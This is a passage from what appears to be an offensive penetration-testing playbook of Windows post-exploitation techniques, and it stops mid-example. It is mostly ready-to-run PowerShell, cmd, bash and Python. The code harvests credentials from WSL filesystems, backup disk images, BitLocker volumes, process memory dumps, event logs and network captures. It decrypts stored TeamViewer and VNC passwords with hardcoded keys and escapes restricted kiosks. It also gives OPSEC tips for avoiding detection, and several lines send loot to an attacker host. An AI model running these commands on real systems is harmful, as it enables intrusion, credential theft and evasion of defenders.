Get-ChildItem 'C:\Program Files\WindowsApps' -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'Canonical|Ubuntu|SUSE|Debian|Kali' }

# Per-user Store-installed distros — WSL packages live under one of these
Get-ChildItem "C:\Users\<USER>\AppData\Local\Packages" -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'CanonicalGroupLimited|TheDebianProject|kali|SUSE' }
```

#### Enumerate Linux rootfs from PowerShell — no bash invocation
```powershell
# Anchor the rootfs path discovered above
$base = 'C:\Users\<USER>\AppData\Local\Packages\<WSL_PACKAGE>\LocalState\rootfs'

# Top-level rootfs walk
Get-ChildItem "$base" -Force
Get-ChildItem "$base\root" -Force
Get-ChildItem "$base\home" -Force
```

#### High-value reads — credential mining the Linux side
```powershell
# Shell history — frequently contains plaintext mount/smbclient/ssh/su commands
Get-Content "$base\root\.bash_history" -ErrorAction SilentlyContinue
Get-Content "$base\home\<LINUX_USER>\.bash_history" -ErrorAction SilentlyContinue

# DB client history — passwords often pasted on the command line
Get-Content "$base\root\.mysql_history" -ErrorAction SilentlyContinue
Get-Content "$base\root\.psql_history" -ErrorAction SilentlyContinue

# Linux shadow — readable from Windows side (NTFS ACLs, not Linux DAC)
Get-Content "$base\etc\shadow" -ErrorAction SilentlyContinue

# SSH keys — root's and per-user
Get-ChildItem "$base\root\.ssh\" -Force -ErrorAction SilentlyContinue
Get-ChildItem "$base\home\<LINUX_USER>\.ssh\" -Force -ErrorAction SilentlyContinue
Get-Content "$base\root\.ssh\id_rsa" -ErrorAction SilentlyContinue

# Cloud creds inside the WSL rootfs
Get-Content "$base\root\.aws\credentials" -ErrorAction SilentlyContinue
Get-Content "$base\home\<LINUX_USER>\.aws\credentials" -ErrorAction SilentlyContinue

# App-specific configs
Get-Content "$base\home\<LINUX_USER>\.config\<APP>\config" -ErrorAction SilentlyContinue
```

#### Recursive credential sweep across the rootfs
```powershell
# PowerShell-side grep across root/home/etc for password-like strings
Get-ChildItem "$base\root","$base\home","$base\etc" -Recurse -Force -ErrorAction SilentlyContinue | Select-String -Pattern 'password|passwd|secret|api[_-]?key|token' -List | Select-Object Path -First 50
```

#### Living-off-the-land alternative — invoke bash directly
```powershell
# Confirm bash/wsl on PATH
where.exe wsl ; where.exe bash

# Quick triage — default WSL user is often root for Ubuntu.zip self-extracts
wsl -- id ; wsl -- whoami ; wsl -- hostname
bash -c "id; whoami; hostname"

# Read root-owned files (uid 0 inside WSL even though Windows side is unprivileged)
bash -c "ls -la /root"
bash -c "cat /root/.bash_history"
bash -c "cat /root/.mysql_history /root/.psql_history 2>/dev/null"
bash -c "ls -la /root/.ssh/ 2>/dev/null; cat /root/.ssh/id_* 2>/dev/null"
bash -c "cat /etc/shadow"

# Pivot from WSL → mount Windows C$ via SMB localloop
bash -c "mkdir -p /mnt/c_loop && mount -t cifs //127.0.0.1/c$ /mnt/c_loop -o user=<USER>,password=<PASSWORD>"
bash -c "smbclient -U '<USER>%<PASSWORD>' \\\\127.0.0.1\\c$"

# Recursive credential grep from inside WSL
bash -c "grep -RInE 'password|passwd|secret|api[_-]?key|token' /root /home /etc /opt 2>/dev/null | head -50"
```

> **Tip:** WSL default user on Ubuntu.zip self-extract installs is often **root** with no shared password hash with the Windows account — `.bash_history` is the prize because admins paste plaintext SMB / domain creds while testing `mount //127.0.0.1/c$` or `smbclient` from inside WSL.

> **OPSEC:** Reading the rootfs over the Windows path leaves no Linux audit trail (no `auth.log`, no sudo log) — preferred over `wsl.exe`/`bash.exe` invocation when defenders monitor process creation for `bash.exe` / `wsl.exe`.

---

### 4.28b WSL Network-Facing SSH as External Entry Point

When nmap discovers SSH on a nonstandard port (e.g., 2222) reaching a WSL instance, an SSH key recovered from a Windows share or user profile grants Linux access. From inside WSL, `/mnt/c` exposes the entire Windows filesystem including SAM hives, NTDS.dit backups, and user profiles.

```bash
# Discover nonstandard SSH during port scan
nmap -p- --min-rate 5000 -Pn <TARGET> | grep open
# Example: 2222/tcp open  EtherNetIP-1

# Banner grab to confirm WSL/Ubuntu
nmap -p 2222 -sV -Pn <TARGET>
# OpenSSH on Ubuntu = likely WSL

# SSH in with recovered key from Windows share loot
ssh -i <RECOVERED_KEY> -p 2222 <USER>@<TARGET>

# Inside WSL — access Windows C: drive via /mnt/c
ls -la /mnt/c/Users/
cat /mnt/c/Users/<ADMIN>/Desktop/*.txt
cat /mnt/c/Windows/System32/config/SAM       # readable if running as root in WSL
cat /mnt/c/Windows/NTDS/ntds.dit             # if DC backup exists

# Copy SAM/SYSTEM for offline extraction
cp /mnt/c/Windows/System32/config/SAM /tmp/SAM
cp /mnt/c/Windows/System32/config/SYSTEM /tmp/SYSTEM
# Exfil to attacker, then:
# impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

#### Living-off-the-land / LOTL variant

```bash
# From inside WSL — no tools needed beyond standard coreutils
find /mnt/c/Users -name "*.kdbx" -o -name "*.rdg" -o -name "id_rsa" -o -name "*.pfx" 2>/dev/null
grep -rIl "password\|secret\|apikey" /mnt/c/Users/ 2>/dev/null | head -20
cat /mnt/c/Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt 2>/dev/null
```

### 4.28c Windows Kiosk / Restricted-Shell Escape via Browser file:// Scheme

When landing on a kiosk, thin-client, or RDP session with a restricted desktop (only specific apps allowed), the browser `file://` URI scheme provides filesystem access that can be pivoted to code execution.

```
# === Browser-based escape (works in IE, Edge, Chrome in kiosk mode) ===
# Type in address bar:
file:///C:/Windows/System32/
# Navigate to cmd.exe or powershell.exe, right-click → Open

# Direct path to shell:
file:///C:/Windows/System32/cmd.exe
file:///C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe

# If exe execution is blocked, try script hosts:
file:///C:/Windows/System32/cscript.exe
file:///C:/Windows/System32/wscript.exe
file:///C:/Windows/System32/mshta.exe
```

```cmd
:: === Alternative escape vectors from restricted desktop ===

:: Help menu escape — many apps have Help > Contents that opens a CHM/browser
:: Inside the help browser: right-click > View Source / Print > opens Notepad/dialog
:: File > Open dialog acts as a file browser — navigate to cmd.exe, type *.exe in filename field

:: Ctrl+Shift+Esc → Task Manager (if not blocked) → File > Run new task > cmd.exe

:: Win+R (Run dialog) — type: cmd.exe, powershell.exe, or \\<ATTACKER_IP>\share\nc.exe

:: Explorer shell via shortcut creation:
:: Right-click desktop > New > Shortcut > type: cmd.exe > finish > double-click

:: Sticky keys at login screen (if RDP access):
:: Press Shift 5 times at login → if sethc.exe is replaced, drops to shell

:: Print dialog escape:
:: Any app > File > Print > Microsoft Print to PDF or XPS > outputs .pdf
:: But "Print to File" path field allows navigating filesystem
:: Type: C:\Windows\System32\cmd.exe in the filename field > press Enter

:: Office apps (if available):
:: Open macro-enabled doc > Alt+F11 (VBA editor) > Shell "cmd.exe"
:: Or: =EXEC("cmd.exe") in Excel (if macros enabled)
```

```powershell
# === Process allowlist bypass ===
# If AppLocker blocks cmd.exe/powershell.exe by name, use alternate paths:
C:\Windows\Sysnative\cmd.exe
C:\Windows\SysWOW64\cmd.exe
C:\Windows\WinSxS\*\cmd.exe
# Or LOLBins that spawn shells:
C:\Windows\System32\bash.exe           # WSL bash
C:\Windows\System32\OpenSSH\ssh.exe    # SSH to attacker → reverse tunnel back
```

#### Living-off-the-land / LOTL variant

```cmd
:: All techniques above are LOTL by definition — no tools needed.
:: Priority escape order:
:: 1. file:///C:/Windows/System32/cmd.exe in browser address bar
:: 2. Win+R → cmd.exe
:: 3. Help menu → View Source → opens Notepad/browser with file access
:: 4. Task Manager → Run new task → cmd.exe
:: 5. Ctrl+O (Open dialog) in any app → type cmd.exe in filename → Enter
```

### 4.28d Windows Recycle Bin File Recovery (Post-Ex Loot from Deleted Files)

Users delete sensitive files (cred sheets, configs, scripts) thinking they are gone. The `$Recycle.Bin` directory retains them until emptied. Each deleted file is stored as a `$R` (content) + `$I` (metadata) pair under the user's SID folder.

```powershell
# === Enumerate Recycle Bin contents for all users (requires admin or SeBackupPrivilege) ===
Get-ChildItem 'C:\$Recycle.Bin' -Force -Recurse -ErrorAction SilentlyContinue |
  Where-Object { $_.Name -match '^\$R' } |
  Select-Object FullName, Length, LastWriteTime | Sort-Object LastWriteTime -Descending

# Current user's recycle bin only (no admin needed)
$shell = New-Object -ComObject Shell.Application
$recycleBin = $shell.NameSpace(0x0A)  # 0x0A = Recycle Bin namespace
$recycleBin.Items() | ForEach-Object {
    [PSCustomObject]@{
        Name = $_.Name
        Path = $_.Path
        Size = $_.Size
        DateDeleted = $recycleBin.GetDetailsOf($_, 2)
        OriginalLocation = $recycleBin.GetDetailsOf($_, 1)
    }
}

# Recover a specific file from Recycle Bin to a working directory
Copy-Item 'C:\$Recycle.Bin\<USER_SID>\$R<HASH>' -Destination 'C:\Windows\Temp\recovered_file.txt'
```

```cmd
:: cmd.exe — list deleted files (admin or owner context)
dir /a /s C:\$Recycle.Bin\

:: Identify file by looking at $I metadata (first 8 bytes = header, then original path in Unicode)
:: Copy $R file to working dir for inspection
copy "C:\$Recycle.Bin\<USER_SID>\$R<HASH>" C:\Windows\Temp\recovered.bin
```

```powershell
# === Mass recovery — copy all deleted files for triage ===
New-Item -ItemType Directory -Path 'C:\Windows\Temp\recycle_loot' -Force
Get-ChildItem 'C:\$Recycle.Bin' -Force -Recurse -ErrorAction SilentlyContinue |
  Where-Object { $_.Name -match '^\$R' -and $_.Length -gt 0 } |
  ForEach-Object { Copy-Item $_.FullName "C:\Windows\Temp\recycle_loot\$($_.Name)_$($_.Directory.Name)" }

# Then scan for credentials
Get-ChildItem 'C:\Windows\Temp\recycle_loot' |
  Select-String -Pattern 'password|secret|apikey|connectionstring' -List
```

#### Living-off-the-land / LOTL variant

```cmd
:: Pure cmd.exe — no PowerShell, no tools
dir /a /s C:\$Recycle.Bin\ 2>nul
:: Copy interesting files by size/extension
for /R C:\$Recycle.Bin %f in ($R*) do @if %~zf GTR 100 copy "%f" C:\Windows\Temp\recycle_loot\ >nul 2>&1
```

### 4.28e VHD / VHDX Backup Image Mounting and Offline Filesystem Extraction

Windows backup solutions (Windows Server Backup, Veeam, SCDPM) produce VHD/VHDX disk images. When found on shares or locally, mount them to extract SAM/SYSTEM hives, NTDS.dit, or sensitive files without triggering live-system credential-dumping detections.

```powershell
# === Windows (admin) — native Mount-DiskImage ===
# Find VHD/VHDX files
Get-ChildItem -Path C:\,E:\,F:\ -Recurse -Include *.vhd,*.vhdx -ErrorAction SilentlyContinue | Select FullName, Length, LastWriteTime

# Common backup locations
dir /s /b C:\WindowsImageBackup\*.vhd 2>nul
dir /s /b \\<FILE_SERVER>\Backups\*.vhdx 2>nul

# Mount the VHD (assigns a drive letter)
Mount-DiskImage -ImagePath 'C:\WindowsImageBackup\<HOST>\Backup*\<GUID>.vhdx' -PassThru | Get-Disk | Get-Partition | Get-Volume

# Or via diskpart (works on older OS)
# diskpart
# select vdisk file="C:\path\to\backup.vhdx"
# attach vdisk readonly
# list volume
# exit

# After mounting — extract SAM/SYSTEM/SECURITY for offline hash dump
copy E:\Windows\System32\config\SAM C:\Windows\Temp\SAM
copy E:\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM
copy E:\Windows\System32\config\SECURITY C:\Windows\Temp\SECURITY

# On a DC backup — extract NTDS.dit
copy E:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit

# Dismount when done
Dismount-DiskImage -ImagePath 'C:\WindowsImageBackup\<HOST>\Backup*\<GUID>.vhdx'
```

```bash
# === Linux (attacker box) — after exfiltrating the VHD/VHDX ===
# guestmount (libguestfs — handles VHD/VHDX/VMDK/QCOW2)
sudo apt install -y libguestfs-tools
sudo mkdir /mnt/vhd
sudo guestmount -a backup.vhdx -m /dev/sda1 --ro /mnt/vhd
ls /mnt/vhd/Windows/System32/config/
sudo cp /mnt/vhd/Windows/System32/config/{SAM,SYSTEM,SECURITY} ./
sudo guestunmount /mnt/vhd

# qemu-nbd alternative
sudo modprobe nbd max_part=8
sudo qemu-nbd -r -c /dev/nbd0 backup.vhdx
sudo mount -o ro /dev/nbd0p1 /mnt/vhd
sudo cp /mnt/vhd/Windows/System32/config/{SAM,SYSTEM,SECURITY} ./
sudo umount /mnt/vhd && sudo qemu-nbd -d /dev/nbd0

# Extract hashes offline
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
# For NTDS.dit:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

#### Living-off-the-land / LOTL variant

```cmd
:: Windows native — diskpart (no PowerShell needed, works on Server 2008+)
echo select vdisk file="C:\WindowsImageBackup\<HOST>\<GUID>.vhdx" > %TEMP%\vhd.txt
echo attach vdisk readonly >> %TEMP%\vhd.txt
echo exit >> %TEMP%\vhd.txt
diskpart /s %TEMP%\vhd.txt
:: Find the new drive letter with 'wmic logicaldisk list brief'
:: Copy hives, then detach:
echo select vdisk file="C:\WindowsImageBackup\<HOST>\<GUID>.vhdx" > %TEMP%\dvhd.txt
echo detach vdisk >> %TEMP%\dvhd.txt
echo exit >> %TEMP%\dvhd.txt
diskpart /s %TEMP%\dvhd.txt
```

### 4.28f BitLocker Locked-Volume Unlock with Recovery Key

When a BitLocker recovery key is found (AD attribute `ms-FVE-RecoveryPassword`, GPO backup, printed key document, or user's Microsoft account), use it to unlock encrypted volumes on the same or different host.

```powershell
# === Find BitLocker status on current system ===
manage-bde -status
Get-BitLockerVolume | Format-Table MountPoint, VolumeStatus, EncryptionMethod, KeyProtector

# === Unlock a locked volume with known recovery key ===
# Recovery key format: 6 groups of 6 digits separated by dashes
manage-bde -unlock D: -RecoveryPassword <XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX>

# PowerShell equivalent
Unlock-BitLocker -MountPoint "D:" -RecoveryPassword "<RECOVERY_KEY>"

# === Unlock with recovery key file (.bek) ===
manage-bde -unlock D: -RecoveryKey "C:\path\to\recovery.bek"

# After unlock — access the volume normally
dir D:\Windows\System32\config\
copy D:\Windows\System32\config\SAM C:\temp\SAM
```

```bash
# === Linux — unlock BitLocker volumes with dislocker ===
sudo apt install -y dislocker
# With recovery password
sudo dislocker -r -V /dev/sda2 -p<XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX-XXXXXX> -- /mnt/bitlocker
sudo mount -o ro /mnt/bitlocker/dislocker-file /mnt/windows
ls /mnt/windows/Windows/System32/config/

# With .bek file
sudo dislocker -r -V /dev/sda2 -k /path/to/recovery.bek -- /mnt/bitlocker
sudo mount -o ro /mnt/bitlocker/dislocker-file /mnt/windows
```

#### Living-off-the-land / LOTL variant

```cmd
:: manage-bde is native on all BitLocker-capable Windows (Pro/Enterprise/Server)
manage-bde -status
manage-bde -unlock E: -RecoveryPassword <RECOVERY_KEY>
:: After unlock, copy hives directly
copy E:\Windows\System32\config\SAM C:\temp\SAM
copy E:\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

### 4.28g Application Process Memory + LevelDB Mining for Cleartext Secrets

Beyond LSASS, user-mode applications (Electron apps, KeePass, Putty, Slack, Discord, browser processes) hold cleartext credentials in heap memory. LevelDB/IndexedDB on-disk stores persist unencrypted session data.

```powershell
# === Dump arbitrary user-process memory with procdump ===
# Identify interesting processes
Get-Process | Where-Object { $_.ProcessName -match 'keepass|putty|slack|discord|teams|firefox|chrome|outlook|filezilla|mremoteng|mobaxterm' } |
  Select-Object Id, ProcessName, Path

# Dump target process (Sysinternals procdump — signed, less likely blocked than mimikatz)
procdump.exe -accepteula -ma <PID> C:\Windows\Temp\<PROCESS_NAME>.dmp

# Strings search on the dump for credentials
strings -a -n 8 C:\Windows\Temp\<PROCESS_NAME>.dmp | findstr /i "password passwd pwd user= uid= smtp:// ftp:// http"
```

```powershell
# === On-target PowerShell — dump and grep without procdump ===
# .NET MiniDumpWriteDump via comsvcs.dll (same technique as LSASS dump, different PID)
$pid = (Get-Process -Name '<TARGET_PROCESS>').Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\app.dmp full
```

```bash
# === Offline analysis on attacker box ===
strings -a -n 8 app.dmp | grep -iE 'password|passwd|pwd|secret|token|api.key|smtp|ftp|ssh'
strings -a -e l -n 8 app.dmp | grep -iE 'password|passwd|pwd'  # UTF-16LE (Windows wide strings)
```

```powershell
# === LevelDB / IndexedDB on-disk store mining ===
# Electron apps (Slack, Discord, Teams, VSCode) store data in LevelDB
Get-ChildItem "$env:APPDATA" -Recurse -Filter *.ldb -ErrorAction SilentlyContinue | Select FullName
Get-ChildItem "$env:LOCALAPPDATA" -Recurse -Filter *.ldb -ErrorAction SilentlyContinue | Select FullName

# Grep LevelDB files for secrets (plaintext strings embedded in binary format)
Get-ChildItem "$env:APPDATA\discord\Local Storage\leveldb" -Filter *.ldb -ErrorAction SilentlyContinue |
  ForEach-Object { Select-String -Path $_.FullName -Pattern 'token|password|mfa\.' -AllMatches }

# Chrome/Edge IndexedDB (cookie jars, session storage)
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\IndexedDB" -Recurse -Filter *.ldb |
  ForEach-Object { Select-String -Path $_.FullName -Pattern 'password|token|session' -AllMatches }
```

#### Living-off-the-land / LOTL variant

```cmd
:: comsvcs.dll dump is fully native (no procdump upload needed)
:: Get PID first:
tasklist | findstr /i "keepass putty slack"
:: Dump:
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\app.dmp full
:: Grep (findstr on binary files — limited but works for ASCII strings):
findstr /s /i "password passwd secret token" C:\Windows\Temp\app.dmp
```

### 4.28h Windows Event Log (.evtx) Offline Analysis for Credential Recovery

Exported or exfiltrated `.evtx` files contain cleartext credentials from 4688 command-line logging and the classic 4625 pattern where users accidentally type their password in the username field during failed logon.

```powershell
# === On-target: export Security log to file (Event Log Readers or admin) ===
wevtutil epl Security C:\Windows\Temp\security.evtx

# === On-target: quick 4625 hunt (password-in-username-field pattern) ===
Get-WinEvent -Path 'C:\Windows\Temp\security.evtx' -FilterHashtable @{Id=4625} |
  Select-Object TimeCreated, @{n='TargetUser';e={$_.Properties[5].Value}},
    @{n='Workstation';e={$_.Properties[13].Value}},
    @{n='FailReason';e={$_.Properties[7].Value}} |
  Where-Object { $_.TargetUser -notmatch '^(SYSTEM|-|DWM-|UMFD-)' } |
  Sort-Object TargetUser -Unique | Format-Table
# TargetUser values that look like passwords (special chars, mixed case, long) = leaked creds

# === 4688 command-line credential extraction ===
Get-WinEvent -Path 'C:\Windows\Temp\security.evtx' -FilterHashtable @{Id=4688} |
  Where-Object { $_.Message -match '/p:|-Password |/pass:|ConvertTo-SecureString' } |
  Select-Object TimeCreated, @{n='Cmd';e={($_.Message -split "`n" | Select-String 'Command Line').Line}} |
  Format-Table -Wrap
```

```bash
# === Linux offline analysis with chainsaw (fast EVTX parser + Sigma rules) ===
# https://github.com/WithSecureLabs/chainsaw
chainsaw hunt security.evtx -s /path/to/sigma/rules/ --mapping chainsaw/mappings/sigma-event-logs-all.yml

# === evtx_dump — convert to JSON for jq processing ===
# https://github.com/omerbenamram/evtx
evtx_dump -o json security.evtx | jq 'select(.Event.System.EventID == 4625) | .Event.EventData.TargetUserName' | sort -u

# 4688 command-line extraction
evtx_dump -o json security.evtx | jq 'select(.Event.System.EventID == 4688) | .Event.EventData.CommandLine' | grep -iE 'pass|pwd|secret'

# === hayabusa — timeline + credential-pattern detection ===
# https://github.com/Yamato-Security/hayabusa
hayabusa csv-timeline -d . -o timeline.csv
grep -i "password\|credential" timeline.csv
```

#### Living-off-the-land / LOTL variant

```cmd
:: wevtutil native — export + text search without PowerShell
wevtutil epl Security %TEMP%\sec.evtx
wevtutil qe %TEMP%\sec.evtx /q:"*[System[(EventID=4625)]]" /f:text > %TEMP%\4625.txt
findstr /i "Account Name" %TEMP%\4625.txt | sort | uniq
:: Look for entries where "Account Name" looks like a password string
```

### 4.28i TeamViewer Unattended Password Decryption (CVE-2019-18988)

TeamViewer stores unattended access passwords in the registry encrypted with a static AES-128-CBC key. Any local user can read the encrypted blob; the key is hardcoded in the binary.

```powershell
# === Read encrypted password from registry ===
# TeamViewer 7-14 (32-bit registry path on 64-bit OS uses WoW6432Node)
reg query "HKLM\SOFTWARE\WOW6432Node\TeamViewer" /v SecurityPasswordAES 2>nul
reg query "HKLM\SOFTWARE\TeamViewer" /v SecurityPasswordAES 2>nul

# TeamViewer 9+ also stores:
reg query "HKLM\SOFTWARE\WOW6432Node\TeamViewer" /v OptionsPasswordAES 2>nul
reg query "HKLM\SOFTWARE\WOW6432Node\TeamViewer" /v SecurityPasswordExported 2>nul
reg query "HKLM\SOFTWARE\WOW6432Node\TeamViewer" /v ServerPasswordAES 2>nul

# Also check HKCU for per-user installs
reg query "HKCU\SOFTWARE\TeamViewer" /s 2>nul | findstr /i "PasswordAES"
```

```python3
# === Decrypt on attacker box (static AES key from CVE-2019-18988) ===
# Key:  0602000000a400005253413100040000
# IV:   0100010067244F436E6762F25EA8D704
import sys
from Crypto.Cipher import AES

key = bytes.fromhex("0602000000a400005253413100040000")
iv  = bytes.fromhex("0100010067244F436E6762F25EA8D704")
# Paste the hex blob from SecurityPasswordAES registry value:
encrypted = bytes.fromhex("<HEX_BLOB_FROM_REGISTRY>")

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted)
password = decrypted.decode('utf-16-le').rstrip('\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10')
print(f"[+] TeamViewer Password: {password}")
```

```bash
# Metasploit module (post-exploitation)
# msfconsole → use post/windows/gather/credentials/teamviewer_passwords
# set SESSION <id> → run
```

#### Living-off-the-land / LOTL variant

```powershell
# Read the registry blob natively — decryption still requires Python/tool on attacker side
$val = (Get-ItemProperty 'HKLM:\SOFTWARE\WOW6432Node\TeamViewer' -Name SecurityPasswordAES -ErrorAction SilentlyContinue).SecurityPasswordAES
if ($val) { Write-Output "[+] TeamViewer SecurityPasswordAES: $([BitConverter]::ToString($val) -replace '-','')" }
# Exfil the hex string to attacker box for decryption with the script above
```

### 4.28j TightVNC / VNC Registry Password Decryption (Fixed DES Key)

VNC servers (TightVNC, RealVNC, UltraVNC) store the access password encrypted with a well-known fixed DES key (`\x17\x52\x6B\x06\x23\x4E\x58\x07`). Extract from registry, decrypt offline.

```powershell
# === Read encrypted VNC password from registry ===
# TightVNC
reg query "HKLM\SOFTWARE\TightVNC\Server" /v Password 2>nul
reg query "HKLM\SOFTWARE\TightVNC\Server" /v PasswordViewOnly 2>nul
reg query "HKCU\SOFTWARE\TightVNC\Server" /v Password 2>nul

# RealVNC (4.x stores in HKLM, 5+ in HKCU)
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul
reg query "HKCU\SOFTWARE\RealVNC\VNCServer" /v Password 2>nul

# UltraVNC
reg query "HKLM\SOFTWARE\ORL\WinVNC3\Default" /v Password 2>nul
reg query "HKLM\SOFTWARE\ORL\WinVNC\Default" /v Password 2>nul

# UltraVNC ini file (alternative storage)
type "C:\Program Files\UltraVNC\ultravnc.ini" 2>nul | findstr /i "passwd"
```

```bash
# === Decrypt with the fixed DES key on attacker box ===
# Using vncpwd (https://github.com/jeroennijhof/vncpwd) or msfconsole
echo '<HEX_BLOB>' | xxd -r -p > vnc_encrypted.bin

# Python3 decryption (DES ECB, key bits reversed per byte)
python3 -c "
import sys
from Crypto.Cipher import DES
key = bytes([23,82,107,6,35,78,88,7])  # 0x17,0x52,0x6B,0x06,0x23,0x4E,0x58,0x07
enc = bytes.fromhex('$1')  # paste hex blob
cipher = DES.new(key, DES.MODE_ECB)
print(cipher.decrypt(enc).rstrip(b'\x00').decode())
" '<HEX_BLOB>'

# Metasploit post module
# use post/windows/gather/credentials/vnc → set SESSION <id> → run
```

#### Living-off-the-land / LOTL variant

```cmd
:: Registry read is native — decryption requires Python/tool on attacker side
reg query "HKLM\SOFTWARE\TightVNC\Server" /v Password
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password
:: Exfil the hex value to attacker for decryption
```

### 4.28k Wireshark / tshark Credential Extraction from Network Traffic

Capture cleartext credentials from protocols that transmit in plain (LDAP simple-bind, FTP, HTTP Basic, SMTP AUTH, Telnet, POP3, IMAP) using Wireshark or tshark on a compromised host with network visibility.

```bash
# === Capture on target (Windows or Linux pivot host) ===
# tshark — capture to pcap (run as admin/root)
tshark -i <INTERFACE> -w /tmp/capture.pcap -f "port 21 or port 25 or port 80 or port 110 or port 143 or port 389 or port 23"

# Time-limited capture (120 seconds)
tshark -i <INTERFACE> -a duration:120 -w /tmp/capture.pcap
```

```bash
# === Extract credentials with tshark display filters (offline on attacker) ===

# LDAP simple-bind (port 389 unencrypted)
tshark -r capture.pcap -Y "ldap.bindRequest" -T fields -e ip.src -e ldap.bindRequest_element -e ldap.simple

# FTP credentials
tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e ip.src -e ftp.request.command -e ftp.request.arg

# HTTP Basic Auth
tshark -r capture.pcap -Y "http.authorization" -T fields -e ip.src -e http.host -e http.authorization
# Decode base64: echo '<base64>' | base64 -d

# SMTP AUTH (port 25/587)
tshark -r capture.pcap -Y "smtp.auth.username || smtp.auth.password" -T fields -e ip.src -e smtp.auth.username -e smtp.auth.password

# POP3 credentials
tshark -r capture.pcap -Y "pop.request.command == USER || pop.request.command == PASS" -T fields -e pop.request.parameter

# IMAP LOGIN
tshark -r capture.pcap -Y "imap.request contains LOGIN" -T fields -e ip.src -e imap.request

# Telnet (character-at-a-time — reconstruct with follow stream)
tshark -r capture.pcap -Y "telnet" -z "follow,tcp,ascii,0"
```

```bash
# === PCredz — automated credential extraction from pcap ===
# https://github.com/lgandx/PCredz
python3 Pcredz -f capture.pcap
# Outputs: FTP, HTTP, LDAP, SMTP, POP, IMAP, Telnet, NTLMv1/v2 credentials

# === net-creds (alternative) ===
# https://github.com/DanMcInerney/net-creds
python2 net-creds.py -p capture.pcap
```

```powershell
# === Windows — capture with netsh (native, no Wireshark install) ===
netsh trace start capture=yes tracefile=C:\Windows\Temp\trace.etl maxsize=512
# Wait for traffic...
netsh trace stop
# Convert ETL to pcap with etl2pcapng (Microsoft tool) on attacker side
```

#### Living-off-the-land / LOTL variant

```cmd
:: Native Windows network capture (no Wireshark/tshark needed)
:: netsh trace produces ETL format — convert to pcap on attacker with etl2pcapng
netsh trace start capture=yes tracefile=C:\Windows\Temp\nettrace.etl maxsize=256 persistent=no
:: Let it run during authentication window, then:
netsh trace stop
:: Exfil nettrace.etl to attacker, convert with: etl2pcapng.exe nettrace.etl output.pcap
:: Then analyze with tshark filters above
```

### 4.28l Dynamic Analysis — Hosts File Redirect + Wireshark for Unknown Binary Credential Capture

For unknown compiled binaries (Nim/Go/Rust/C++) that connect to hardcoded internal servers, redirect DNS via hosts file to your listener and capture cleartext protocol traffic (commonly LDAP simple-bind).

```cmd
:: 1. File triage — identify target server from strings
strings -a -n 8 <UNKNOWN_BINARY>.exe | findstr /i "ldap:// server= host= port= .internal .local .corp"
:: Note the target hostname

:: 2. Redirect target hostname to attacker IP via hosts file (requires admin)
echo <ATTACKER_IP>    <TARGET_HOSTNAME> >> C:\Windows\System32\drivers\etc\hosts

:: 3. Start listener/capture on attacker for the target protocol
```

```bash
# Attacker side — LDAP simple-bind capture (most common for internal tools)
# Option A: tshark live capture on port 389
sudo tshark -i <INTERFACE> -f "port 389" -Y "ldap.bindRequest" -T fields -e ldap.bindRequest_element -e ldap.simple

# Option B: nc listener for raw protocol inspection
sudo nc -lvnp 389 | tee raw_ldap.bin

# Option C: Responder in analyze mode (captures NTLM and logs cleartext where possible)
sudo responder -I <INTERFACE> -A
```

```cmd
:: 4. Execute the binary on target — it connects to your listener now
<UNKNOWN_BINARY>.exe

:: 5. Cleanup hosts file
:: Remove the line you added (or restore from backup)
findstr /v "<TARGET_HOSTNAME>" C:\Windows\System32\drivers\etc\hosts > %TEMP%\hosts.tmp
copy /y %TEMP%\hosts.tmp C:\Windows\System32\drivers\etc\hosts
```

#### Living-off-the-land / LOTL variant

```cmd
:: Hosts file edit + execution is fully native
:: The only non-LOTL component is the attacker-side capture (tshark/nc/responder)
type C:\Windows\System32\drivers\etc\hosts
echo <ATTACKER_IP>    <TARGET_HOSTNAME> >> C:\Windows\System32\drivers\etc\hosts
:: Run binary, capture creds, restore hosts file
```

### 4.28m File Magic-Byte Forensic Repair (Fix Corrupted Office/Archive Files)

CTF/exam scenarios present intentionally corrupted files (first bytes zeroed, wrong magic signature). Repair by patching the magic bytes to the correct file type, then open normally.

```bash
# === Identify the corruption ===
file <CORRUPTED_FILE>           # reports "data" or wrong type
xxd <CORRUPTED_FILE> | head -5  # inspect first bytes

# === Common magic bytes reference ===
# ZIP/DOCX/XLSX/PPTX: 50 4B 03 04
# PDF:                 25 50 44 46 2D  (%PDF-)
# PNG:                 89 50 4E 47 0D 0A 1A 0A
# JPEG:                FF D8 FF
# RAR:                 52 61 72 21 1A 07
# 7z:                  37 7A BC AF 27 1C
# MS Office (OLE/DOC): D0 CF 11 E0 A1 B1 1A E1

# === Repair — patch first bytes with printf (preserves rest of file) ===
# Example: fix a corrupted XLSX/DOCX/PPTX (should start with PK ZIP header)
cp <CORRUPTED_FILE> <REPAIRED_FILE>
printf '\x50\x4B\x03\x04' | dd of=<REPAIRED_FILE> bs=1 count=4 conv=notrunc

# Example: fix corrupted PDF
printf '\x25\x50\x44\x46\x2D' | dd of=<REPAIRED_FILE> bs=1 count=5 conv=notrunc

# Example: fix corrupted OLE compound document (DOC/XLS/PPT)
